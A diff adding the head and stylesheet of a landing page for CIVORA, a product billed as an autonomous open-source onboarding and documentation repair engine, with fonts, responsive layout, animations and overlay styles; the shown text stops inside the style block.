@@ -1,0 +1,1295 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#01030F">
+<meta name="description" content="CIVORA — Autonomous Open-Source Onboarding & Documentation Repair Engine. Make every repository ready for its next contributor.">
+<title>CIVORA — Where Repository Documentation Meets Execution Reality</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 38'%3E%3Crect width='32' height='38' rx='4' fill='%2301030F'/%3E%3Cpath d='M16 1 31 9.5v18.8L16 37 1 28.3V9.5ZM1 9.5 16 18l15-8.5M16 18v19M8.5 5.3 23.5 14v18.5M23.5 5.3 8.5 14v18.5M1 19l15 8.5L31 19M1 28.3 23.5 14M31 28.3 8.5 14' fill='none' stroke='white' stroke-width='1.2' stroke-linejoin='round'/%3E%3Cellipse cx='16' cy='28' rx='9' ry='5.1' fill='none' stroke='white' stroke-width='1.2'/%3E%3Cellipse cx='16' cy='28' rx='6' ry='3.4' fill='none' stroke='white' stroke-width='1.2'/%3E%3Cellipse cx='16' cy='28' rx='3' ry='1.7' fill='none' stroke='white' stroke-width='1.2'/%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Instrument+Serif:ital@0;1&family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="preload" href="/assets/civora-hero-plate.webp" as="image">
+<style>
+
+/* CIVORA: editorial heritage headings, contemporary civic copy, survey-style data. */
+:root {
+  --ink:#01030F; --white:#ffffff; --blue:#0071FF;
+  --hairline:rgba(255,255,255,.84); --hud:rgba(255,255,255,.78);
+  --scroll:rgba(255,255,255,.88);
+  --font-display:'Instrument Serif',Georgia,'Times New Roman',serif;
+  --font-mono:'IBM Plex Mono',ui-monospace,'Courier New',monospace;
+  --font-mark:'Manrope',Arial,sans-serif;
+  --font-text:'Manrope',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+  --font-mono-text:var(--font-mono);
+  --w-display:400; --w-body:400; --w-body-strong:600; --w-caption:400;
+  --w-mono:500; --w-nav:600; --w-mono-label:500; --w-mark:600;
+  --t-display:80px; --lh-display:73px; --tr-display:-.015em;
+  --t-body:21px; --lh-body:28px; --tr-body:0em; --tr-body-strong:-.015em;
+  --t-nav:12px; --tr-nav:.085em; --t-caption:13px; --lh-caption:19px;
+  --tr-caption:0em; --t-label:13px; --lh-label:13px; --tr-label:.008em;
+  --t-micro:11.8px; --lh-micro:13px; --tr-micro:0em;
+  --ref-w:1280; --ref-h:720;
+}
+*{box-sizing:border-box}
+html{scrollbar-width:none}
+html::-webkit-scrollbar{display:none}
+body{margin:0;background:var(--ink);color:var(--white);font-family:var(--font-text);font-weight:var(--w-body);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;font-synthesis:none;overflow-x:hidden;text-rendering:geometricPrecision}
+button,a{-webkit-tap-highlight-color:transparent}
+a{color:inherit}
+button{font:inherit;cursor:pointer}
+:focus-visible{outline:2px solid #4DA3FF;outline-offset:3px;border-radius:4px}
+::selection{background:var(--blue);color:white}
+.frame{position:fixed;inset:0;width:100%;height:100vh;height:100dvh;overflow:hidden;background:var(--ink);isolation:isolate}
+.track{height:700vh}
+.plate{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;object-position:50% 50%;z-index:0;pointer-events:none;user-select:none;-webkit-user-select:none}
+.film{opacity:0;transition:opacity .9s ease;background:var(--ink)}
+.film.on{opacity:1}
+.media-failed .poster{object-position:var(--fallback-x,50%) var(--fallback-y,50%)}
+.stage{position:absolute;left:0;top:0;width:var(--sw,1280px);height:var(--sh,720px);transform-origin:0 0;transform:scale(var(--s,1));z-index:1;pointer-events:none}
+.veil{position:absolute;inset:0;z-index:0;pointer-events:none;opacity:0}
+.veil-v{background:radial-gradient(ellipse 36% 34% at 50% 52%,rgba(1,3,15,.58),rgba(1,3,15,.22) 55%,transparent 78%)}
+.veil-e{background:linear-gradient(to bottom,rgba(1,3,15,.82) 0,rgba(1,3,15,.42) 24%,transparent 44%),linear-gradient(to top,rgba(1,3,15,.5) 0,transparent 26%)}
+.scenes{position:absolute;inset:0;z-index:1;pointer-events:none}
+.scene{position:absolute;inset:0;opacity:0;visibility:hidden}
+.scene.live{visibility:visible}
+.bar{position:absolute;inset:0;opacity:var(--bo,1);z-index:6;pointer-events:none}
+.bar a,.bar button{pointer-events:auto}
+.brand{position:absolute;left:0;top:0;text-decoration:none;width:218px;height:66px}
+.mark{position:absolute;left:35px;top:19.5px;width:32px;height:38px;overflow:visible}
+.mark path,.mark ellipse{fill:none;stroke:rgba(255,255,255,.88);stroke-width:1.15;stroke-linejoin:round;stroke-linecap:round;vector-effect:non-scaling-stroke}
+.wordmark{position:absolute;left:75.5px;top:20px;font-family:var(--font-mark);font-weight:var(--w-mark);font-size:27px;line-height:37px;letter-spacing:.13em;color:white}
+.nav{position:absolute;left:50%;margin-left:-197px;top:26px;height:24px;display:flex;align-items:center;gap:21.7px}
+.nav a,.navcta{font-family:var(--font-text);font-weight:var(--w-nav);font-size:var(--t-nav);line-height:1;letter-spacing:var(--tr-nav);display:flex;align-items:center;gap:9px;white-space:nowrap;text-decoration:none;transition:color .25s ease}
+.nav a:hover,.nav a:focus-visible,.navcta:hover,.navcta:focus-visible,.mnav>a:hover,.mnav>a:focus-visible{color:#8FC2FF}
+.chev{width:10px;height:6px;fill:none;stroke:currentColor;stroke-width:1.7;stroke-linecap:square}
+.navcta{position:absolute;right:38px;top:26px;height:24px;gap:15px;word-spacing:normal}
+.square{display:flex;align-items:center;justify-content:center;width:24px;height:24px;flex:none;background:var(--blue);border-radius:5.5px;box-shadow:0 0 9px rgba(0,113,255,.28);transition:transform .25s ease,box-shadow .25s ease}
+.square svg{width:13px;height:13px;fill:none;stroke:white;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+.navcta:hover .square,.cta:hover .square,.mobile-cta:hover .square,.navcta:focus-visible .square,.cta:focus-visible .square{transform:translate(1px,-1px);box-shadow:0 0 20px rgba(0,113,255,.7)}
+.body,.foot{position:absolute;inset:0;opacity:var(--ho,1);pointer-events:none}
+.body{z-index:3}
+.body::before{content:"";position:absolute;left:18px;top:calc(126px + (100% - 720px) * .22);width:650px;height:225px;z-index:-1;background:rgba(1,3,15,.48);filter:blur(34px);pointer-events:none}
+.headline{position:absolute;left:40px;top:calc(140px + (100% - 720px) * .22);display:flex;flex-direction:column;margin:0;font-family:var(--font-display);font-weight:var(--w-display);font-size:var(--t-display);line-height:var(--lh-display);letter-spacing:var(--tr-display);white-space:nowrap}
+.headline i{display:block;font-style:normal;overflow:hidden;padding:.2em 0 .28em;margin:-.2em 0 -.28em}
+.headline i span{display:block}
+.headline i:last-child span{font-style:italic}
+.headline,.cta,.sub,.scroll,.hudgroup{translate:0 var(--hy,0px)}
+.cta{position:absolute;left:40.5px;top:calc(379.5px + (100% - 720px) * .22);width:206px;height:56px;border:1px solid var(--hairline);border-radius:8px;background:rgba(255,255,255,.02);-webkit-backdrop-filter:blur(6px);backdrop-filter:blur(6px);transition:border-color .3s,background .3s;text-decoration:none;pointer-events:auto}
+.cta:hover,.cta:focus-visible,.burger:hover,.mobile-cta:hover{background:rgba(255,255,255,.07);border-color:white}
+.cta-label{position:absolute;left:16.5px;top:50%;transform:translateY(calc(-50% + 1.5px));font-family:var(--font-text);font-weight:600;font-size:11.5px;line-height:1;letter-spacing:.07em;white-space:nowrap;word-spacing:normal}
+.cta .square{position:absolute;left:auto;right:16px;top:16px}
+.sub{position:absolute;left:42px;bottom:44px;margin:0;font-size:var(--t-body);line-height:var(--lh-body);font-weight:var(--w-body);letter-spacing:var(--tr-body)}
+.sub b{display:block;font-weight:var(--w-body-strong);letter-spacing:var(--tr-body-strong)}
+.scroll{position:absolute;right:49px;bottom:36px;display:flex;align-items:center;justify-content:center;gap:7px;color:var(--scroll);font-size:var(--t-caption);line-height:var(--lh-caption);font-weight:var(--w-caption);letter-spacing:var(--tr-caption);white-space:nowrap}
+.scroll{text-shadow:0 1px 4px var(--ink),0 0 12px var(--ink)}
+.scroll-mark{width:16px;height:19px;overflow:visible}
+.scroll-mark path,.scroll-mark ellipse{fill:none;stroke:rgba(255,255,255,.8);stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+.hudgroup{position:absolute;inset:0;pointer-events:none;opacity:var(--ho,1)}
+.hud{position:absolute;left:50%;top:50%;margin:-360px 0 0 -640px;width:1280px;height:720px;overflow:visible}
+.hud .dashed,.hud .solid{fill:none;stroke:var(--hud);stroke-width:1}
+.hud .dashed{stroke-dasharray:1.6 2.8}
+.hud .ring{fill:none;stroke:var(--hud);stroke-width:1.4}
+.hud .dot{fill:var(--hud)}
+.hud .plus{stroke:white;stroke-width:2.4;stroke-linecap:butt}
+.hud .arrow{fill:none;stroke:var(--hud);stroke-width:1.4;stroke-linejoin:round;stroke-linecap:round}
+.hud .node{transform-box:fill-box;transform-origin:center}
+.pill{position:absolute;left:calc(50% + 90px);top:calc(50% - 10px);width:71px;height:23px;border-radius:5px;background:var(--blue);box-shadow:0 0 12px rgba(0,113,255,.30);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-weight:500;font-size:13px;line-height:13px;letter-spacing:var(--tr-label)}
+.pill span{transform:translateX(.3px)}
+.annot,.ghost{position:absolute;left:calc(50% + 255px);top:calc(50% + 24px);font-family:var(--font-mono);font-weight:500;font-size:11.8px;line-height:13px;letter-spacing:0em;white-space:pre;color:rgba(255,255,255,.95)}
+.annot span{display:block;min-height:13px}
+.annot span:first-child{padding-left:3px}
+.ghost{left:calc(50% + 228px);color:rgba(255,255,255,.5);opacity:0}
+[data-hero="off"] .body,[data-hero="off"] .foot,[data-hero="off"] .hudgroup{visibility:hidden}
+[data-bar="off"] .bar{visibility:hidden}
+.vision{display:flex;flex-direction:column;justify-content:center;align-items:center;padding:0 24px;text-align:center}
+.vision .tag{display:inline-block;font-family:var(--font-mono-text);font-weight:500;font-size:max(10px,calc(9px * var(--k,1)));line-height:1;letter-spacing:.02em;padding:.46em .56em .4em;border-radius:3px;background:var(--blue);box-shadow:0 0 13px rgba(0,113,255,.28)}
+.vision h2{display:flex;flex-direction:column;margin:max(16px,calc(20px * var(--k,1))) 0 0;font-family:var(--font-display);font-weight:400;font-size:max(34px,calc(46px * var(--k,1)));line-height:1.04;letter-spacing:-.012em}
+.vision h2 i{display:block;overflow:hidden;font-style:normal;padding:.08em 0 .12em;margin:-.08em 0 -.12em}
+.vision h2 span{display:block;transform:translate3d(0,110%,0)}
+.vision p{margin:max(16px,calc(22px * var(--k,1))) 0 0;font-family:var(--font-text);font-weight:400;font-size:max(14px,calc(14.5px * var(--k,1)));line-height:1.5;letter-spacing:0;color:rgba(255,255,255,.94)}
+.eco-top{position:absolute;left:0;right:0;top:calc(104px * var(--k,1))}
+.eco-label{position:absolute;left:max(18px,calc(16px * var(--k,1)));top:calc(5px * var(--k,1));font-family:var(--font-mono-text);font-weight:500;font-size:max(9.5px,calc(7.8px * var(--k,1)));line-height:1.1;letter-spacing:.01em;color:rgba(255,255,255,.6)}
+.eco h2{margin:0 3% 0 34.75%;max-width:27.5em;font-family:var(--font-display);font-weight:400;font-size:max(24px,calc(32px * var(--k,1)));line-height:1.08;letter-spacing:-.012em;color:rgba(255,255,255,.94)}
+#spots{position:absolute;inset:0}
+.spot{--d:max(20px,calc(23px * var(--k,1)));position:absolute;left:var(--x);top:var(--y);translate:calc(var(--d) / -2) -50%;display:flex;align-items:center;gap:max(7px,calc(8px * var(--k,1)));opacity:0;transform-origin:calc(var(--d) / 2) 50%}
+.pin{position:relative;display:flex;align-items:center;justify-content:center;width:var(--d);height:var(--d);flex:none;border-radius:50%;background:var(--blue);box-shadow:0 0 14px rgba(0,113,255,.55)}
+.pin svg{width:62%;height:62%;fill:white}
+.pin::after{content:"";position:absolute;inset:0;border:1px solid rgba(77,163,255,.9);border-radius:50%;animation:pin-pulse 2.4s cubic-bezier(.2,.7,.3,1) infinite;animation-play-state:paused}
+.eco.live .pin::after{animation-play-state:running}
+.spot:nth-child(2) .pin::after{animation-delay:-.6s}.spot:nth-child(3) .pin::after{animation-delay:-1.2s}.spot:nth-child(4) .pin::after{animation-delay:-1.8s}
+.cap{font-family:var(--font-mono-text);font-weight:600;font-size:max(8.5px,calc(7.4px * var(--k,1)));line-height:1.12;letter-spacing:.01em;color:white;white-space:nowrap;text-shadow:0 1px 3px var(--ink),0 0 8px var(--ink),0 0 14px var(--ink)}
+.cap sub{font-size:.72em;vertical-align:-.12em}
+@keyframes pin-pulse{from{transform:scale(1);opacity:.85}to{transform:scale(2.1);opacity:0}}
+.burger{display:none;align-items:center;justify-content:center;flex-direction:column;gap:4px;width:36px;height:36px;padding:0;border:1px solid var(--hairline);border-radius:8px;background:rgba(255,255,255,.02);-webkit-backdrop-filter:blur(6px);backdrop-filter:blur(6px);transition:border-color .3s,background .3s}
+.burger span{display:block;width:16px;height:1.5px;background:white;transition:transform .38s cubic-bezier(.22,.8,.2,1),opacity .2s}
+.burger[aria-expanded="true"] span:nth-child(1){transform:translateY(5.5px) rotate(45deg)}
+.burger[aria-expanded="true"] span:nth-child(2){opacity:0;transform:scaleX(.3)}
+.burger[aria-expanded="true"] span:nth-child(3){transform:translateY(-5.5px) rotate(-45deg)}
+.mnav{display:none}
+.mnav>a{font-family:var(--font-text);font-weight:600;font-size:14px;line-height:1;letter-spacing:var(--tr-nav);text-decoration:none;white-space:nowrap;color:white;transition:color .25s ease}
+.mobile-cta{display:inline-flex;align-items:center;justify-content:space-between;align-self:flex-start;min-width:200px;height:52px;padding:0 15px 0 17px;margin-top:20px;border:1px solid var(--hairline);border-radius:8px;background:rgba(255,255,255,.02);-webkit-backdrop-filter:blur(6px);backdrop-filter:blur(6px);transition:background .3s,border-color .3s}
+#contact{max-width:calc(100vw - 40px);width:470px;margin:auto;padding:36px;border:1px solid rgba(255,255,255,.3);border-radius:14px;color:white;background:rgba(4,9,26,.97);font-family:var(--font-text);box-shadow:0 30px 100px rgba(0,0,0,.5)}
+#contact::backdrop{background:rgba(1,3,15,.78);-webkit-backdrop-filter:blur(12px);backdrop-filter:blur(12px)}
+#contact:not([open]){display:none}
+#contact h2{font-family:var(--font-display);font-size:38px;line-height:1.08;letter-spacing:-.015em;font-weight:400;margin:0 0 18px}
+#contact p{font-size:15px;line-height:1.6;font-weight:400;color:rgba(255,255,255,.8);margin:0 0 28px}
+#contact button{border:1px solid var(--hairline);border-radius:6px;padding:11px 23px;background:var(--blue);color:white;font-family:var(--font-mono-text);font-size:13px;font-weight:500}
+@media (prefers-reduced-motion:no-preference){
+html:not(.motion-done) .headline{display:flex;flex-direction:column}
+html:not(.motion-done) .headline span{transform:translateY(130%);animation:e-line .66s cubic-bezier(.19,1,.22,1) forwards;will-change:transform}
+html:not(.motion-done) .headline i:nth-child(1) span{animation-delay:.18s}
+html:not(.motion-done) .headline i:nth-child(2) span{animation-delay:.34s}
+html:not(.motion-done) .headline i:nth-child(3) span{animation-delay:.50s}
+html:not(.motion-done) .brand,html:not(.motion-done) .nav,html:not(.motion-done) .navcta,html:not(.motion-done) .burger{opacity:0;animation:e-frame .5s cubic-bezier(.22,.8,.2,1) forwards;will-change:opacity,transform}
+html:not(.motion-done) .brand{animation-delay:.06s}
+html:not(.motion-done) .nav{animation-delay:.14s}
+html:not(.motion-done) .navcta,html:not(.motion-done) .burger{animation-delay:.22s}
+html:not(.motion-done) .cta{opacity:0;animation:e-act .55s cubic-bezier(.22,.8,.2,1) .74s forwards;will-change:opacity,transform}
+html:not(.motion-done) .sub{opacity:0;animation:e-lift .6s cubic-bezier(.22,.8,.2,1) .86s forwards;will-change:opacity,transform}
+html:not(.motion-done) .scroll{opacity:0;animation:e-fade .45s ease-out 1.24s forwards}
+html:not(.motion-done) .node{opacity:0;animation:e-lock .45s cubic-bezier(.19,1,.22,1) .98s forwards}
+html:not(.motion-done) .axes{opacity:0;animation:e-fade .5s ease-out 1.08s forwards}
+html:not(.motion-done) .marks{opacity:0;animation:e-fade .5s ease-out 1.18s forwards}
+html:not(.motion-done) .pill{opacity:0;animation:e-settle .45s cubic-bezier(.19,1,.22,1) 1.20s forwards}
+html:not(.motion-done) .annot{opacity:0;animation:e-fade .4s ease-out 1.32s forwards}
+@keyframes e-line{to{transform:none}}
+@keyframes e-frame{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:none}}
+@keyframes e-lift{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+@keyframes e-act{from{opacity:0;transform:translateY(8px) scale(.99)}to{opacity:1;transform:none}}
+@keyframes e-fade{to{opacity:1}}
+@keyframes e-lock{from{opacity:0;transform:scale(.35)}to{opacity:1;transform:none}}
+@keyframes e-settle{from{opacity:0;transform:scale(.92)}to{opacity:1;transform:none}}
+}
+@media (max-width:1000px), (max-aspect-ratio:12/10) and (max-width:1200px){
+.stage{width:100%;height:100%;transform:none;display:flex;flex-direction:column;padding:max(18px,env(safe-area-inset-top)) 22px max(18px,env(safe-area-inset-bottom));--fs:clamp(26px,min(9.6vw,7.6vh),64px);--hud-s:.62}
+.plate{object-position:58% 46%}
+.frame::after{content:"";position:absolute;inset:0;z-index:0;pointer-events:none;background:linear-gradient(to bottom,rgba(1,3,15,.86),rgba(1,3,15,.30) 26%,transparent 44%),linear-gradient(to top,rgba(1,3,15,.92),rgba(1,3,15,.55) 26%,transparent 52%)}
+.bar{position:relative;inset:auto;display:flex;justify-content:space-between;align-items:center;flex:none;min-height:36px;z-index:6}
+.brand{position:relative;inset:auto;width:auto;height:auto;display:flex;align-items:center;gap:9px}
+.mark{position:static;width:28px;height:33px}
+.wordmark{position:static;font-size:23px;line-height:1}
+.nav,.navcta{display:none}
+.burger{display:flex}
+.square{width:21px;height:21px;border-radius:5px}
+.square svg{width:11px;height:11px}
+.body{position:relative;inset:auto;flex:1;display:flex;flex-direction:column;justify-content:center;align-items:flex-start;gap:clamp(16px,3.5vh,30px);min-height:0;z-index:3}
+.body::before{left:-32px;right:-32px;top:23%;bottom:20%;width:auto;height:auto;background:rgba(1,3,15,.68);filter:blur(42px)}
+.headline{position:relative;inset:auto;font-size:var(--fs);line-height:.985;white-space:normal;max-width:15ch}
+.headline i{display:inline;overflow:visible;padding:0;margin:0}
+.headline i span{display:inline}
+.headline i+i::before{content:" "}
+.cta{position:relative;inset:auto;flex:none;width:clamp(146px,42vw,170px);height:clamp(46px,6.4vh,54px)}
+.cta-label{left:clamp(13px,3.6vw,17px);font-size:clamp(11px,2.8vw,13px)}
+.cta .square{left:auto;right:clamp(12px,3.4vw,16px);top:50%;margin-top:-10.5px}
+.foot{position:relative;inset:auto;display:flex;flex-direction:column;gap:clamp(12px,2.5vh,20px);flex:none;z-index:3}
+.sub{position:relative;inset:auto;font-size:clamp(14px,3.9vw,18px);line-height:1.34;max-width:34ch}
+.sub b{margin-bottom:.18em}
+.sub br{display:none}
+.scroll{position:relative;inset:auto;align-self:flex-end;font-size:12px}
+.scroll-mark{width:14px;height:17px}
+.hudgroup{inset:auto;left:50%;top:62%;width:1280px;height:720px;margin:-360px 0 0 -640px;transform:scale(var(--hud-s));transform-origin:center;z-index:2}
+.mnav{position:absolute;display:flex;flex-direction:column;gap:2px;left:0;right:0;top:0;padding:76px 22px 26px;z-index:5;background:rgba(2,5,20,.92);-webkit-backdrop-filter:blur(26px) saturate(140%);backdrop-filter:blur(26px) saturate(140%);border-bottom:1px solid rgba(255,255,255,.12);transform:translateY(-102%);transition:transform .42s cubic-bezier(.22,.8,.2,1),visibility .42s;pointer-events:none;visibility:hidden}
+.mnav.open{transform:translateY(0);box-shadow:0 0 0 100vmax rgba(1,3,15,.82);pointer-events:auto;visibility:visible}
+.mnav>a:not(.mobile-cta){padding:13px 0;border-bottom:1px solid rgba(255,255,255,.08)}
+.mnav>a:nth-child(4){border-bottom:0}
+.vision h2{font-size:clamp(32px,9.2vw,54px)}
+.vision p{font-size:clamp(14px,3.8vw,17px);max-width:26ch}
+.vision p br{display:none}
+.eco-top{top:max(104px,calc(env(safe-area-inset-top) + 88px));padding:0 22px;display:flex;flex-direction:column;gap:14px}
+.eco-label{position:static}
+.eco h2{margin:0;max-width:22em;font-size:clamp(24px,6.2vw,36px);line-height:1.12}
+.spot{left:var(--mx);top:var(--my)}
+.veil-e{background:linear-gradient(to bottom,rgba(1,3,15,.9),rgba(1,3,15,.6) 30%,transparent 56%),linear-gradient(to top,rgba(1,3,15,.5),transparent 26%)}
+}
+@media (min-width:520px) and (max-width:1000px), (min-width:520px) and (max-aspect-ratio:12/10) and (max-width:1200px){
+.stage{padding:max(30px,env(safe-area-inset-top)) clamp(34px,4.6vw,60px) max(30px,env(safe-area-inset-bottom));--hud-s:.72}
+.plate{object-position:56% 48%}
+.frame::after{background:linear-gradient(to bottom,rgba(1,3,15,.72),rgba(1,3,15,.20) 24%,transparent 42%),linear-gradient(to top,rgba(1,3,15,.88),rgba(1,3,15,.42) 24%,transparent 48%)}
+.mark{width:34px;height:40px}.wordmark{font-size:29px}
+.burger{width:44px;height:44px;gap:4.5px}.burger span{width:19px}
+.burger[aria-expanded="true"] span:nth-child(1){transform:translateY(6px) rotate(45deg)}
+.burger[aria-expanded="true"] span:nth-child(3){transform:translateY(-6px) rotate(-45deg)}
+.body{justify-content:flex-start;padding-top:clamp(24px,7vh,86px);gap:clamp(26px,4vh,40px)}
+.headline{font-size:clamp(44px,9.4vw,86px);line-height:1;max-width:none;white-space:nowrap}
+.headline i{display:block;overflow:hidden;padding:.2em 0 .28em;margin:-.2em 0 -.28em}
+.headline i span{display:block}
+.headline i:last-child span{font-style:italic}.headline i+i::before{content:none}
+.cta{width:172px;height:56px}
+.cta-label{left:16.5px;font-size:12px}
+.cta .square{right:16px;width:24px;height:24px;border-radius:5.5px;margin-top:-12px}
+.cta .square svg{width:13px;height:13px}
+.foot{flex-direction:row;align-items:flex-end;justify-content:space-between;gap:clamp(24px,4.5vw,56px)}
+.sub{font-size:clamp(17px,2.1vw,21px);line-height:1.28;max-width:31ch}
+.scroll{flex:none;font-size:14px}.scroll-mark{width:16px;height:19px}
+.mnav{padding:104px clamp(34px,4.6vw,60px) 40px}
+.mnav>a:not(.mobile-cta){padding:17px 0;font-size:16px}
+.mobile-cta{min-width:224px;height:56px;padding:0 16px 0 18px;margin-top:28px}
+.eco-top{padding:0 clamp(34px,4.6vw,60px);top:max(136px,calc(env(safe-area-inset-top) + 122px))}
+}
+@media (max-width:519px){
+.headline{font-size:clamp(28px,calc((100vw - 44px) / 8.45),54px);line-height:1.04;max-width:none;white-space:nowrap}
+.headline i{display:block;overflow:hidden;padding:.2em 0 .28em;margin:-.2em 0 -.28em}
+.headline i span{display:block}
+.headline i:last-child span{font-style:italic}.headline i+i::before{content:none}
+.hudgroup{position:static;display:flex;flex-direction:row;flex-wrap:wrap;align-items:center;gap:9px;inset:auto;width:auto;height:auto;margin:0 0 clamp(10px,1.6vh,16px);transform:none;flex:none;pointer-events:auto}
+.hud{--hs:.58;left:50%;top:50%;width:1280px;height:720px;transform:translateX(calc(-122.5px * var(--hs))) scale(var(--hs));transform-origin:center;pointer-events:none}
+.ghost{display:none}
+.pill{position:static;width:64px;height:21px;font-size:11.5px;border-radius:5px}
+.annot{position:static;font-size:10.5px;line-height:1.2;color:rgba(255,255,255,.62);white-space:normal}
+.annot span{display:inline;min-height:0}.annot span:first-child{padding:0}.annot span:first-child::after{content:" "}
+}
+@media (max-width:519px){.hudgroup{translate:none}.hud{translate:0 var(--hy,0px)}}
+@media (max-width:900px) and (max-height:560px){
+.sub,.pill,.annot,.hudgroup,.hud{display:none}
+.stage{padding:12px 18px}
+.body{gap:10px;justify-content:center;padding-top:0}
+.headline{font-size:clamp(25px,5.3vh,38px)}
+.cta{height:42px}.mark{width:24px;height:28px}.wordmark{font-size:23px}
+.foot{gap:8px}.burger{width:36px;height:36px}
+.mnav{padding:58px 18px 18px;max-height:100dvh;overflow:auto}
+.mnav>a:not(.mobile-cta){padding:10px 0;font-size:13px}
+.mobile-cta{height:42px;margin-top:12px}
+}
+
+/* Interactive survey points retain their original registered anchors. */
+.spot{border:0;padding:0;min-height:44px;background:none;color:white;font:inherit;text-align:left;pointer-events:none;-webkit-appearance:none;appearance:none}
+.eco.live .spot.is-ready{pointer-events:auto}
+.spot:disabled{cursor:default}
+.spot:focus-visible{outline-offset:7px;border-radius:7px}
+.pin{transition:transform .22s cubic-bezier(.22,.8,.2,1),box-shadow .22s ease,background .22s ease}
+.pin svg{transition:transform .24s cubic-bezier(.22,.8,.2,1)}
+.cap{position:relative;transition:color .2s ease,transform .22s cubic-bezier(.22,.8,.2,1)}
+.cap::after{content:"READ PLACE +";position:absolute;left:0;top:calc(100% + 5px);font-size:8px;letter-spacing:.05em;opacity:0;transform:translateY(3px);transition:opacity .18s ease,transform .22s ease;color:#8FC2FF;pointer-events:none}
+.spot:focus-visible .pin,.spot[aria-expanded="true"] .pin{transform:scale(1.12);box-shadow:0 0 0 4px rgba(0,113,255,.12),0 0 24px rgba(0,113,255,.72)}
+.spot:focus-visible .cap,.spot[aria-expanded="true"] .cap{color:#B8D9FF;transform:translateX(3px)}
+.spot:focus-visible .cap::after{opacity:1;transform:none}
+.spot:active .pin{transform:scale(.96)}
+.pill,.annot{border:0;padding:0;color:white;pointer-events:auto;cursor:pointer;-webkit-appearance:none;appearance:none;transition:box-shadow .22s ease,color .2s ease,background .2s ease}
+.pill{isolation:isolate}
+.pill::before{content:"";position:absolute;inset:-11px 0;z-index:-1}
+.pill span{transition:transform .2s ease}
+.pill:focus-visible{box-shadow:0 0 20px rgba(0,113,255,.62)}
+.annot{background:none;text-align:left;min-height:26px}
+.annot:focus-visible{color:#8FC2FF}
+.node-hit{pointer-events:all;cursor:pointer}
+.node-focus{fill:none;stroke:#8FC2FF;stroke-width:1.3;opacity:0;transition:opacity .2s ease}
+.node-hit .node{transition:filter .2s ease}
+.node-hit:focus-visible .node-focus,.node-hit[aria-expanded="true"] .node-focus{opacity:1}
+.node-hit:focus-visible .node{filter:drop-shadow(0 0 4px #0071FF)}
+.frame.notes-open .pin::after{animation-play-state:paused}
+@media(hover:hover){
+.spot:not(:disabled):hover .pin{transform:scale(1.12);box-shadow:0 0 0 4px rgba(0,113,255,.12),0 0 24px rgba(0,113,255,.72)}
+.spot:not(:disabled):hover .pin svg{transform:rotate(12deg)}
+.spot:not(:disabled):hover .cap{color:#B8D9FF;transform:translateX(3px)}
+.spot:not(:disabled):hover .cap::after{opacity:1;transform:none}
+.pill:hover{background:#167EFF;box-shadow:0 0 22px rgba(0,113,255,.56)}
+.pill:hover span{transform:translate(.3px,-1px)}
+.annot:hover{color:#8FC2FF}
+.node-hit:hover .node-focus{opacity:1}
+.node-hit:hover .node{filter:drop-shadow(0 0 4px #0071FF)}
+}
+/* A local editorial overlay, never a new page section or external destination. */
+#placeNotes{position:fixed;inset:24px 28px 24px auto;margin:auto 0;width:438px;max-width:calc(100vw - 56px);max-height:calc(100dvh - 48px);padding:0;overflow:auto;overscroll-behavior:contain;scrollbar-width:thin;scrollbar-color:rgba(255,255,255,.18) transparent;border:1px solid rgba(255,255,255,.22);border-radius:14px;background:rgba(4,9,23,.97);color:white;font-family:var(--font-text);box-shadow:0 24px 100px rgba(0,0,0,.48),inset 0 1px rgba(255,255,255,.04);opacity:0;transform:translateX(16px);transition:opacity .22s ease,transform .26s cubic-bezier(.22,.8,.2,1)}
+#placeNotes:not([open]){display:none}
+#placeNotes.is-open{opacity:1;transform:none}
+#placeNotes.is-closing{opacity:0;transform:translateX(10px);transition-duration:.16s}
+#placeNotes::backdrop{background:rgba(1,3,15,.38);-webkit-backdrop-filter:blur(3px);backdrop-filter:blur(3px);opacity:0;transition:opacity .22s ease}
+#placeNotes.is-open::backdrop{opacity:1}
+.note-top{display:flex;align-items:center;justify-content:space-between;padding:17px 20px 17px 28px;border-bottom:1px solid rgba(255,255,255,.12)}
+.note-eyebrow{display:flex;align-items:center;gap:10px;font-family:var(--font-mono-text);font-size:10px;font-weight:500;letter-spacing:.075em;color:rgba(255,255,255,.7)}
+.note-eyebrow::before{content:"";width:6px;height:6px;border-radius:50%;background:var(--blue);box-shadow:0 0 9px rgba(0,113,255,.6)}
+.note-close{display:flex;align-items:center;justify-content:center;width:44px;height:44px;margin:-8px -8px -8px 0;border:1px solid transparent;border-radius:7px;color:rgba(255,255,255,.72);background:transparent;transition:color .18s ease,background .18s ease,border-color .18s ease}
+.note-close svg{width:16px;height:16px;fill:none;stroke:currentColor;stroke-width:1.4;stroke-linecap:round}
+.note-close:hover{color:white;background:rgba(255,255,255,.06);border-color:rgba(255,255,255,.18)}
+.note-top{position:sticky;top:0;z-index:2;background:rgba(4,9,23,.98)}
+.note-copy{padding:27px 28px 24px;opacity:1;transform:none;transition:opacity .15s ease,transform .18s ease}
+.note-copy.is-changing{opacity:0;transform:translateY(5px)}
+.note-kind{display:block;font-family:var(--font-mono-text);font-size:10px;line-height:1.3;letter-spacing:.035em;font-weight:500;color:#8FC2FF;margin:0 0 13px}
+#placeNotes h2{margin:0;font-family:var(--font-display);font-size:42px;line-height:1.06;font-weight:400;letter-spacing:-.012em}
+.note-deck{margin:12px 0 21px;font-size:16px;line-height:1.45;font-weight:400;color:rgba(255,255,255,.7);letter-spacing:-.012em}
+.note-history{margin:0;font-size:14px;line-height:1.65;font-weight:400;color:rgba(255,255,255,.85)}
